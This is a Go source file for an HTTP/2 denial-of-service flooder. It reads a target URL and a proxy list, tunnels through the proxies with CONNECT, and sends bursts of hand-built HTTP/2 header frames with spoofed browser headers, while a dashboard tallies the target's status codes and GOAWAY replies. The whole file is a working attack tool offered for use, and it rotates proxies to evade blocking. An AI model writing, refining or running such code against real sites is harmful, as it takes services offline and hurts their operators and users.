package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2/hpack"
)

var (
	t_hostname string
	t_path     string
	t_port     int

	rate    int
	secs    int
	thr     int
	proxies [][2]string
)

func init() {
	var proxyFile, t_url string
	flag.StringVar(&t_url, "u", "", "target url")
	flag.IntVar(&rate, "r", 64, "requests per conn")
	flag.IntVar(&secs, "s", 60, "duration")
	flag.IntVar(&thr, "t", 1, "thread count")
	flag.StringVar(&proxyFile, "p", "", "proxy.txt")
	flag.Parse()

	if t_url == "" || proxyFile == "" {
		fmt.Println("invalid url or proxies")
		os.Exit(1)
	}
	parsed_url, err := url.Parse(t_url)
	if err != nil {
		fmt.Println("Failed to parse url")
		os.Exit(1)
	}
	t_hostname = parsed_url.Hostname()
	t_path = parsed_url.RequestURI()
	if parsed_url.Port() == "" {
		t_port = 443
	} else {
		t_port, err = strconv.Atoi(parsed_url.Port())
		if err != nil {
			fmt.Println("invalid port in url")
			os.Exit(1)
		}
	}
	fileData, err := os.ReadFile(proxyFile)
	if err != nil {
		fmt.Println("failed to open file with proxies")
		os.Exit(1)
	}
	proxyList := strings.Split(strings.ReplaceAll(strings.TrimSpace(string(fileData)), "\r\n", "\n"), "\n")
	
	for _, p := range proxyList {
		if p == "" {
			continue
		}
		parts := strings.Split(p, ":")
		pLen := len(parts)
		if pLen != 2 && pLen != 4 {
			continue
		}
		if pLen == 2 {
			proxies = append(proxies, [2]string{p, ""})
		} else if pLen == 4 {
			pth := fmt.Sprintf("%s:%s", parts[0], parts[1])
			ptc := fmt.Sprintf("%s:%s", parts[2], parts[3])
			proxies = append(proxies, [2]string{pth, fmt.Sprintf("Basic %s", base64.StdEncoding.EncodeToString([]byte(ptc)))})
		}
	}
	if len(proxies) < 1 {
		fmt.Println("no valid proxies provided")
		os.Exit(1)
	}
}

func main() {
	var wg sync.WaitGroup
	// Flood thread'lerini başlat
	for i := 0; i < thr; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			flooder(t_hostname, t_path, t_port)
		}()
	}

	// Metrikleri ekrana basan goroutine
	go func() {
		started := time.Now()
		dur := time.Duration(secs) * time.Second
		for time.Since(started) < dur {
			time.Sleep(1 * time.Second)
			timeLeft := int((dur - time.Since(started)).Seconds())
			if timeLeft < 0 {
				timeLeft = 0
			}

			statusString := fmt.Sprintf("\x1bc\x1b[H%s | LEFT: %ds\r\nSTATUS MENU:\r\n  rps: %d\r\n  ", 
				time.Now().Format("02.01.2006 15:04:05"), timeLeft, atomic.LoadUint64(&rps))
			
			// Durum kodlarını güvenli oku ve ekle
			appendStat := func(code string, val *uint64) {
				if v := atomic.LoadUint64(val); v > 0 {
					statusString += fmt.Sprintf("%s: %d\r\n  ", code, v)
				}
			}

			appendStat("200", &s200)
			appendStat("201", &s201)
			appendStat("301", &s301)
			appendStat("302", &s302)
			appendStat("304", &s304)
			appendStat("400", &s400)
			appendStat("403", &s403)
			appendStat("404", &s404)
			appendStat("429", &s429)
			appendStat("500", &s500)
			appendStat("502", &s502) // Önceki kodda s502 -> "200" yazıyordu, düzeltildi.
			appendStat("503", &s503)
			appendStat("504", &s504)
			appendStat("525", &s525)
			appendStat("GOAWAY", &goaway)

			statusString += fmt.Sprintf("Connections: %d", atomic.LoadUint64(&connsAlive))
			fmt.Println(statusString)

			// Sayaçları sıfırla
			atomic.StoreUint64(&rps, 0)
			atomic.StoreUint64(&s200, 0)
			atomic.StoreUint64(&s201, 0)
			atomic.StoreUint64(&s301, 0)
			atomic.StoreUint64(&s302, 0)
			atomic.StoreUint64(&s304, 0)
			atomic.StoreUint64(&s400, 0)
			atomic.StoreUint64(&s403, 0)
			atomic.StoreUint64(&s404, 0)
			atomic.StoreUint64(&s429, 0)
			atomic.StoreUint64(&s500, 0)
			atomic.StoreUint64(&s502, 0)
			atomic.StoreUint64(&s503, 0)
			atomic.StoreUint64(&s504, 0)
			atomic.StoreUint64(&s525, 0)
			atomic.StoreUint64(&goaway, 0)
		}
	}()

	wg.Wait()
}

var (
	rps        uint64
	s200       uint64
	s201       uint64
	s301       uint64
	s302       uint64
	s304       uint64
	s400       uint64
	s403       uint64
	s404       uint64
	s429       uint64
	s500       uint64
	s502       uint64
	s503       uint64
	s504       uint64
	s525       uint64
	goaway     uint64
	connsAlive uint64
)

func flooder(hostname, path string, port int) {
	started := time.Now()
	dur := time.Duration(secs) * time.Second
	headers := [][2]string{
		{":authority", hostname},
		{":method", "GET"},
		{":path", path},
		{":scheme", "https"},
		{"accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
		{"accept-encoding", "gzip, deflate, br"},
		{"accept-language", "en-US,en;q=0.9"},
		{"cache-control", "no-cache"},
		{"pragma", "no-cache"},
		{"sec-ch-ua", "\"Not(A:Brand\";v=\"99\", \"Google Chrome\";v=\"133\""},
		{"sec-ch-ua-mobile", "?0"},
		{"sec-ch-ua-platform", "\"Windows\""},
		{"sec-fetch-dest", "document"},
		{"sec-fetch-mode", "navigate"},
		{"sec-fetch-site", "none"},
		{"user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
	}

	for time.Since(started) < dur {
		for _, p := range proxies {
			if time.Since(started) >= dur {
				return
			}

			conn, err := net.DialTimeout("tcp", p[0], 3*time.Second)
			if err != nil {
				continue
			}

			// HTTP CONNECT tünelleme
			var connectReq string
			if p[1] != "" {
				connectReq = fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: %s\r\n\r\n", hostname, port, hostname, port, p[1])
			} else {
				connectReq = fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n", hostname, port, hostname, port)
			}

			conn.SetDeadline(time.Now().Add(4 * time.Second))
			if _, err := conn.Write([]byte(connectReq)); err != nil {
				conn.Close()
				continue
			}

			reader := bufio.NewReader(conn)
			line, err := reader.ReadString('\n')
			if err != nil || !strings.Contains(line, " 200 ") {
				conn.Close()
				continue
			}
			
			// Kalan HTTP başlıklarını temizle
			for {
				l, err := reader.ReadString('\n')
				if err != nil || l == "\r\n" || l == "\n" {
					break
				}
			}

			// TLS Handshake
			conf := &tls.Config{ServerName: hostname, NextProtos: []string{"h2"}, InsecureSkipVerify: true}
			wrapped := tls.Client(conn, conf)
			if err := wrapped.Handshake(); err != nil {
				wrapped.Close()
				continue
			}

			atomic.AddUint64(&connsAlive, 1)

			// HTTP/2 Connection Preamble & Settings Frame
			if _, err := wrapped.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")); err != nil {
				atomic.AddUint64(&connsAlive, ^uint64(0))
				wrapped.Close()
				continue
			}
			
			// SETTINGS Frame (Ham byte yerine optimize edilmiş yapı)
			settingsFrame := []byte{0x00, 0x00, 0x0c, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x64, 0x00, 0x04, 0x00, 0x60, 0x00, 0x00}
			if _, err := wrapped.Write(settingsFrame); err != nil {
				atomic.AddUint64(&connsAlive, ^uint64(0))
				wrapped.Close()
				continue
			}

			// Okuyucu Döngüsü için WaitGroup ve Sinyal Mekanizması
			var readWg sync.WaitGroup
			readWg.Add(1)

			go func(w *tls.Conn) {
				defer readWg.Done()
				defer atomic.AddUint64(&connsAlive, ^uint64(0))
				defer w.Close()

				dec := hpack.NewDecoder(65536, nil)
				closedStreams := 0

				for closedStreams < rate {
					w.SetReadDeadline(time.Now().Add(4 * time.Second))
					header := make([]byte, 9)
					if _, err := io.ReadFull(w, header); err != nil {
						return
					}

					plen := int(binary.BigEndian.Uint32(append([]byte{0}, header[:3]...)))
					ftype := header[3]
					flags := header[4]

					if ftype == 0x7 { // GOAWAY Frame
						atomic.AddUint64(&goaway, 1)
						return
					}

					payload := make([]byte, plen)
					if _, err := io.ReadFull(w, payload); err != nil {
						return
					}

					if flags&0x1 == 0x1 { // END_STREAM bayrağı kontrolü
						closedStreams++
					}

					if ftype == 0x1 { // HEADERS Frame ise HTTP Status çöz
						hdrs, err := dec.DecodeFull(payload)
						if err != nil {
							continue
						}
						for _, hf := range hdrs {
							if hf.Name == ":status" {
								scode, _ := strconv.Atoi(hf.Value)
								switch scode {
								case 200: atomic.AddUint64(&s200, 1)
								case 201: atomic.AddUint64(&s201, 1)
								case 301: atomic.AddUint64(&s301, 1)
								case 302: atomic.AddUint64(&s302, 1)
								case 304: atomic.AddUint64(&s304, 1)
								case 400: atomic.AddUint64(&s400, 1)
								case 403: atomic.AddUint64(&s403, 1)
								case 404: atomic.AddUint64(&s404, 1)
								case 429: atomic.AddUint64(&s429, 1)
								case 500: atomic.AddUint64(&s500, 1)
								case 502: atomic.AddUint64(&s502, 1)
								case 503: atomic.AddUint64(&s503, 1)
								case 504: atomic.AddUint64(&s504, 1)
								case 525: atomic.AddUint64(&s525, 1)
								}
								break
							}
						}
					}
				}
			}(wrapped)

			// İstekleri (Stream'leri) Gönderme Bölümü
			var hBuf bytes.Buffer
			bw := bufio.NewWriterSize(wrapped, 4096)
			enc := hpack.NewEncoder(&hBuf)
			enc.SetMaxDynamicTableSize(65536)

			var localRqs uint64
			for streamID := uint32(1); streamID < uint32(rate)*2; streamID += 2 {
				hBuf.Reset()
				for i := 0; i < len(headers); i++ {
					enc.WriteField(hpack.HeaderField{Name: headers[i][0], Value: headers[i][1]})
				}

				hLen := make([]byte, 4)
				binary.BigEndian.PutUint32(hLen, uint32(hBuf.Len()))

				bytedStreamID := make([]byte, 4)
				binary.BigEndian.PutUint32(bytedStreamID, streamID&0x7FFFFFFF)

				// Header Frame Yapısı (Type: 0x1, Flags: END_STREAM(0x1) | END_HEADERS(0x4) = 0x5)
				frameHeader := append(hLen[1:], 0x1, 0x5)
				frameHeader = append(frameHeader, bytedStreamID...)

				bw.Write(frameHeader)
				bw.Write(hBuf.Bytes())
				localRqs++
			}
			
			bw.Flush()
			atomic.AddUint64(&rps, localRqs)

			// Okuyucu goroutine bitene kadar veya timeout olana kadar bu bağlantıda kal
			readWg.Wait()
		}
	}
}